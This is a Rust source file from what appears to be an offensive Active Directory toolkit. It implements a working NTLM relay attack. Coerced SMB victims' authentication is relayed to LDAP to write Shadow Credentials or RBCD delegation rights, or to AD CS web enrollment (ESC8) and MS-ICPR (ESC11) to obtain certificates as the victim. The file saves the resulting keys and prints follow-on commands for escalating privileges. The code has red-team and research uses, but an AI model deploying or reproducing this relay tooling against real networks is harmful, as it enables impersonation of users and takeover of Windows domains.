//! NTLM relay: receive a coerced/poisoned SMB victim and relay their auth to
//! LDAP (Shadow Credentials or RBCD write), AD CS Web Enrollment (ESC8), or
//! MS-ICPR (ESC11). Pair with `attack coerce`/`attack poison`.

use anyhow::{Context, Result};
use clap::Parser;


/// Post-relay write action for `attack relay`.
///
/// This is the *CLI selector* for what to do with the relayed victim's
/// session; the internal data-carrying enum below is [`RelayAction`],
/// which additionally carries resolved CA host/port/template/insecure
/// for the ADCS/ICPR variants.
#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
pub enum RelayTarget {
    /// Shadow Credentials: write msDS-KeyCredentialLink on the target object.
    LdapKeycred,
    /// RBCD: write msDS-AllowedToActOnBehalfOfOtherIdentity on the target object.
    LdapRbcd,
    /// ESC8: HTTP relay to AD CS web enrollment — needs --ca-host.
    AdcsHttp,
    /// ESC11: relay to MS-ICPR over ncacn_ip_tcp — needs --ca-host.
    Icpr,
}

#[derive(Parser)]
pub(crate) struct RelayArgs {
    /// SMB address to receive the coerced/poisoned victim on
    #[arg(long, default_value = "0.0.0.0:445")]
    pub listen: String,
    /// Target DC to relay the victim's auth to (LDAP :389)
    #[arg(long)]
    pub target_dc: String,
    /// AD DNS domain, for the base DN (e.g. corp.local)
    #[arg(long)]
    pub realm: String,
    /// Object (sAMAccountName) to write on, as the relayed victim
    #[arg(long)]
    pub target_object: String,
    /// Relay target: `ldap-keycred` (Shadow Cred), `ldap-rbcd` (RBCD write),
    /// `adcs-http` (ESC8), `icpr` (ESC11) — both need --ca-host.
    #[arg(long, value_enum, default_value_t = RelayTarget::LdapKeycred)]
    pub target: RelayTarget,
    /// For `ldap-rbcd`: SID of the account we control that will be granted delegation rights
    /// (typically a computer account we created — required if --target=ldap-rbcd).
    #[arg(long)]
    pub trustee_sid: Option<String>,
    /// For `adcs-http` (ESC8): CA web-enrollment host (e.g. `ca.corp.local`).
    #[arg(long)]
    pub ca_host: Option<String>,
    /// For `adcs-http`: CA template to request (default `User`).
    #[arg(long, default_value = "User")]
    pub ca_template: String,
    /// For `adcs-http`: HTTPS port (default 443; use 80 with `--ca-scheme http`).
    #[arg(long, default_value_t = 443)]
    pub ca_port: u16,
    /// For `adcs-http`: skip TLS cert verification (self-signed / internal CA is the norm).
    #[arg(long, default_value_t = true)]
    pub ca_insecure: bool,
}

/// One of the write-actions the relay can perform once it has an LDAP session as the victim.
///
/// Internal / data-carrying twin of the CLI-facing [`RelayTarget`] value_enum:
/// the CLI parses the selector, then this enum carries the resolved
/// CA host/port/template/insecure into the spawn loop.
#[derive(Clone, Debug)]
enum RelayAction {
    /// Write msDS-KeyCredentialLink on `target_object` (shadow credentials → PKINIT).
    LdapKeycred,
    /// Write msDS-AllowedToActOnBehalfOfOtherIdentity on `target_object` (RBCD → S4U2Proxy).
    LdapRbcd,
    /// ESC8 — relay to AD CS Web Enrollment: `(ca_host, ca_port, template, insecure)`.
    AdcsHttp(String, u16, String, bool),
    /// ESC11 — relay to MS-ICPR (`\PIPE\cert` alternative ncacn_ip_tcp endpoint): `(ca_host, template)`.
    Icpr(String, String),
}

/// NTLM relay: receive a coerced/poisoned SMB auth and relay it to a DC's LDAP as the victim,
/// then perform a chosen write on `target_object`. Chain with `attack coerce`/`poison`.
pub(crate) async fn relay(a: RelayArgs) -> Result<()> {
    use smb2_client::server::RelayConn;

    // Resolve --target early so the user gets a clear error before the listener is up.
    let (target, trustee_sid) = match a.target {
        RelayTarget::LdapKeycred => (RelayAction::LdapKeycred, None),
        RelayTarget::LdapRbcd => {
            let sid = a.trustee_sid.clone().ok_or_else(|| {
                anyhow::anyhow!(
                    "--target ldap-rbcd requires --trustee-sid <SID of a controlled account>"
                )
            })?;
            (RelayAction::LdapRbcd, Some(sid))
        }
        RelayTarget::AdcsHttp => {
            let ca = a.ca_host.clone().ok_or_else(|| {
                anyhow::anyhow!("--target adcs-http requires --ca-host <ca.corp.local>")
            })?;
            (
                RelayAction::AdcsHttp(ca, a.ca_port, a.ca_template.clone(), a.ca_insecure),
                None,
            )
        }
        RelayTarget::Icpr => {
            let ca = a.ca_host.clone().ok_or_else(|| {
                anyhow::anyhow!("--target icpr requires --ca-host <ca.corp.local>")
            })?;
            (RelayAction::Icpr(ca, a.ca_template.clone()), None)
        }
    };

    let base: String = a
        .realm
        .split('.')
        .map(|p| format!("DC={p}"))
        .collect::<Vec<_>>()
        .join(",");
    let listener = RelayConn::listen(&a.listen).await?;
    println!(
        "[*] relay listening on {} → LDAP {} ({:?} on {})",
        a.listen, a.target_dc, target, a.target_object
    );
    println!("    now coerce/poison a victim toward this host (e.g. attack coerce --pipe spoolss --listener <us>)");
    loop {
        let (stream, peer) = listener.accept().await?;
        let (target_dc, base, target_object, trustee, tgt) = (
            a.target_dc.clone(),
            base.clone(),
            a.target_object.clone(),
            trustee_sid.clone(),
            target.clone(),
        );
        tokio::spawn(async move {
            if let Err(e) = relay_one(
                stream,
                &peer.to_string(),
                &target_dc,
                &base,
                &target_object,
                tgt,
                trustee.as_deref(),
            )
            .await
            {
                println!("[-] relay from {peer} failed: {e}");
            }
        });
    }
}

#[allow(clippy::too_many_arguments)]
async fn relay_one(
    stream: tokio::net::TcpStream,
    peer: &str,
    target_dc: &str,
    base: &str,
    target_object: &str,
    target: RelayAction,
    trustee_sid: Option<&str>,
) -> Result<()> {
    use smb2_client::server::RelayConn;
    let mut rc = RelayConn::new(stream);
    let type1 = rc.recv_type1().await?;

    // ESC8 relay: HTTP not LDAP, so branch off before opening the LDAP client.
    if let RelayAction::AdcsHttp(ref ca_host, port, ref template, insecure) = target {
        return relay_esc8(
            rc,
            type1,
            peer,
            target_object,
            ca_host,
            port,
            template,
            insecure,
        )
        .await;
    }
    // ESC11 relay: ncacn_ip_tcp to MS-ICPR — NTLM auth handshake, then unsealed CertServerRequest.
    if let RelayAction::Icpr(ref ca_host, ref template) = target {
        return relay_icpr(rc, type1, peer, target_object, ca_host, template).await;
    }

    println!("[+] victim {peer} started NTLM — relaying to {target_dc} LDAP");
    let mut ld = adhammer_ldap::LdapClient::connect(&format!("{target_dc}:389")).await?;
    let type2 = ld.sasl_step1(&type1).await?; // target's challenge
    rc.send_challenge(&type2).await?; // → victim signs the target's challenge
    let type3 = rc.recv_type3().await?;
    ld.sasl_step2(&type3).await?; // now authenticated to the DC AS the victim
    println!("[+] relayed bind to {target_dc} succeeded as the victim");
    let dn = ld.find_dn(base, target_object).await?;

    match target {
        RelayAction::AdcsHttp(_, _, _, _) | RelayAction::Icpr(_, _) => {
            unreachable!("handled above")
        }
        RelayAction::LdapKeycred => {
            let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
            ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
                .await?;
            std::fs::write(format!("{target_object}.key.pem"), &kc.private_key_pem)?;
            println!("[+] Shadow Credential written on {dn} — key {target_object}.key.pem");
            println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
        }
        RelayAction::LdapRbcd => {
            let trustee = trustee_sid.expect("checked in relay(): --trustee-sid required");
            let trustee = windows_sddl::sid::Sid::parse(trustee)
                .ok_or_else(|| anyhow::anyhow!("bad trustee SID: {trustee}"))?;
            let sd = windows_sddl::build_rbcd_sd(&trustee);
            ld.modify_add(&dn, "msDS-AllowedToActOnBehalfOfOtherIdentity", &sd)
                .await?;
            println!(
                "[+] RBCD written on {dn} — trustee {} can now S4U2Proxy → any user on {target_object}",
                trustee_sid.unwrap()
            );
            println!(
                "    → attack rbcd --host <trustee-host> --target-spn cifs/{target_object} --target-user Administrator"
            );
        }
    }
    Ok(())
}

/// ESC8 — relay a victim's SMB NTLM to AD CS Web Enrollment. Sends `Type1` in the
/// Authorization header on the CSR POST (empty body on the probe), takes the DC's `Type2`
/// out of the `WWW-Authenticate` header, sends it back to the victim, forwards the returned
/// `Type3` on the same TCP connection with the real CSR body — the CA issues a certificate
/// whose Kerberos identity is the relayed victim. Write cert + private key to disk so the
/// attacker can PKINIT with them.
#[allow(clippy::too_many_arguments)]
async fn relay_esc8(
    mut rc: smb2_client::server::RelayConn,
    type1: Vec<u8>,
    peer: &str,
    target_object: &str,
    ca_host: &str,
    ca_port: u16,
    template: &str,
    insecure: bool,
) -> Result<()> {
    use crate::attacks::adcs_relay::{
        base64_decode, base64_encode, cert_request_form, parse_ntlm_challenge, parse_request_id,
        HttpsClient,
    };

    println!(
        "[+] victim {peer} started NTLM — relaying to https://{ca_host}:{ca_port}/certsrv/ (ESC8)"
    );
    let mut http = HttpsClient::connect(ca_host, ca_port, insecure).await?;

    // Generate a fresh CSR; the subject is unused (the CA identifies the requester via the
    // authenticated Kerberos/NTLM channel — that's the victim we're relaying).
    let csr = adhammer_kerberos::csr::build_csr("adhammer-esc8", None)?;
    let csr_pem = pem_wrap("CERTIFICATE REQUEST", &csr.der);
    let form = cert_request_form(&csr_pem, template);

    // Round 1: POST with Type-1 in Authorization; probe body kept minimal until the auth loop
    // completes on Type-3, when we send the real CSR form.
    let type1_b64 = base64_encode(&type1);
    let auth1 = format!("NTLM {type1_b64}");
    let headers1: &[(&str, &str)] = &[
        ("Authorization", &auth1),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("User-Agent", "adhammer-esc8/1"),
    ];
    let r1 = http
        .send("POST", "/certsrv/certfnsh.asp", headers1, b"")
        .await?;
    if r1.status != 401 {
        anyhow::bail!(
            "CA expected 401 with WWW-Authenticate NTLM Type-2, got {} (server may reject relayed auth)",
            r1.status
        );
    }
    let type2 = r1
        .header("WWW-Authenticate")
        .and_then(parse_ntlm_challenge)
        .context("no NTLM Type-2 in WWW-Authenticate")?;

    // Forward Type-2 to the victim and get Type-3 back.
    rc.send_challenge(&type2).await?;
    let type3 = rc.recv_type3().await?;

    // Round 2: POST with Type-3 in Authorization AND the CSR form body.
    let type3_b64 = base64_encode(&type3);
    let auth3 = format!("NTLM {type3_b64}");
    let headers3: &[(&str, &str)] = &[
        ("Authorization", &auth3),
        ("Content-Type", "application/x-www-form-urlencoded"),
        ("User-Agent", "adhammer-esc8/1"),
    ];
    let r2 = http
        .send("POST", "/certsrv/certfnsh.asp", headers3, form.as_bytes())
        .await?;
    if r2.status != 200 {
        anyhow::bail!(
            "CA rejected the CSR submission after NTLM auth: HTTP {} (template `{template}` may require different attrs, or the relayed identity lacks Enroll)",
            r2.status
        );
    }
    let html = String::from_utf8_lossy(&r2.body);
    let req_id = parse_request_id(&html).context("no ReqID in ASP response (submission failed)")?;
    println!("[+] CA accepted submission — Request ID {req_id}, fetching certificate…");

    // Round 3: GET the issued cert. This may reuse the same connection or open a new one;
    // AD CS is happy with either — send unauthenticated (session already established), and if
    // the CA insists, replaying Type-3 here works because it was on the same stream.
    let path = format!("/certsrv/certnew.cer?ReqID={req_id}&Enc=b64");
    let r3 = http
        .send("GET", &path, &[("User-Agent", "adhammer-esc8/1")], b"")
        .await?;
    if r3.status != 200 {
        anyhow::bail!("certnew.cer returned HTTP {} for ReqID {req_id}", r3.status);
    }
    // The response is either PEM or a base64 blob depending on `Enc=b64`.
    let cert_bytes = if r3.body.starts_with(b"-----BEGIN") {
        r3.body.clone()
    } else {
        let s = String::from_utf8_lossy(&r3.body);
        base64_decode(s.trim())
            .map(|der| pem_wrap("CERTIFICATE", &der).into_bytes())
            .unwrap_or(r3.body.clone())
    };
    let cert_path = format!("{target_object}.esc8.pem");
    let key_path = format!("{target_object}.esc8.key.pem");
    std::fs::write(&cert_path, &cert_bytes)?;
    std::fs::write(&key_path, csr.key_pem.as_bytes())?;
    println!("[+] certificate written to {cert_path} — key {key_path}");
    println!(
        "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
    );
    Ok(())
}

/// ESC11 — relay a victim's SMB NTLM to MS-ICPR (`ICertPassage`) on the CA's ncacn_ip_tcp
/// endpoint. Same shape as ESC8: forward Type1 → get Type2 back → forward to victim → get
/// Type3 → complete auth. Then submit the CSR via `CertServerRequest` (opnum 0).
///
/// Uses auth-level `PKT_CONNECT`, not `PKT_PRIVACY` — the relaying attacker doesn't hold the
/// victim's NTLM session key, so per-message signing/sealing is impossible. Whether the CA's
/// ICPR endpoint accepts CONNECT-level auth is a per-server config; if it enforces PRIVACY
/// (spec says it SHOULD), the CertServerRequest will fault with a clear RPC error rather
/// than silently misbehave.
async fn relay_icpr(
    mut rc: smb2_client::server::RelayConn,
    type1: Vec<u8>,
    peer: &str,
    target_object: &str,
    ca_host: &str,
    template: &str,
) -> Result<()> {
    use dcerpc::{epm, icpr, transport::RpcTcp};

    println!("[+] victim {peer} started NTLM — relaying to MS-ICPR at {ca_host} (ESC11)");
    let port = epm::resolve_port(ca_host, icpr::icpr_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{ca_host}:{port}")).await?;

    // 3-leg NTLM handshake, opaquely forwarded.
    let type2 = rpc.bind_relay_start(icpr::icpr_syntax(), &type1).await?;
    rc.send_challenge(&type2).await?;
    let type3 = rc.recv_type3().await?;
    rpc.bind_relay_finish(&type3).await?;
    println!("[+] relayed CONNECT-level bind to ICPR succeeded as the victim");

    // Generate a fresh CSR and submit — the CA identifies the requester from the relayed
    // authentication, so no subject encoding is needed on our side.
    let csr = adhammer_kerberos::csr::build_csr("adhammer-esc11", None)?;
    // The CA name is a required arg to CertServerRequest; on most CAs the ICPR endpoint
    // will infer it from context, but a client that sends the CN of the certification
    // authority is safe. The `target_object` name is not it — take the machine short-name.
    let authority = ca_host.split('.').next().unwrap_or(ca_host);
    let stub = icpr::encode_cert_server_request(authority, template, &csr.der);
    let resp = rpc
        .call(icpr::CERT_SERVER_REQUEST_OPNUM, &stub)
        .await
        .map_err(|e| {
            anyhow::anyhow!(
                "CertServerRequest failed — the CA likely enforces PKT_PRIVACY on ICPR (matrix-validation-owed): {e}"
            )
        })?;
    let result = icpr::decode_cert_server_response(&resp)?;
    if result.disposition != 3 {
        anyhow::bail!(
            "CA disposition {}: {} (3 = ISSUED, 5 = UNDER SUBMISSION, else denied)",
            result.disposition,
            result.message
        );
    }
    let cert_pem = pem_wrap("CERTIFICATE", &result.cert_der);
    let cert_path = format!("{target_object}.esc11.pem");
    let key_path = format!("{target_object}.esc11.key.pem");
    std::fs::write(&cert_path, cert_pem.as_bytes())?;
    std::fs::write(&key_path, csr.key_pem.as_bytes())?;
    println!("[+] ISSUED — certificate written to {cert_path} — key {key_path}");
    println!(
        "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
    );
    Ok(())
}

/// Wrap raw DER as PEM with the given label.
fn pem_wrap(label: &str, der: &[u8]) -> String {
    use crate::attacks::adcs_relay::base64_encode;
    let b64 = base64_encode(der);
    let mut out = format!("-----BEGIN {label}-----\n");
    for line in b64.as_bytes().chunks(64) {
        out.push_str(std::str::from_utf8(line).unwrap());
        out.push('\n');
    }
    out.push_str(&format!("-----END {label}-----\n"));
    out
}
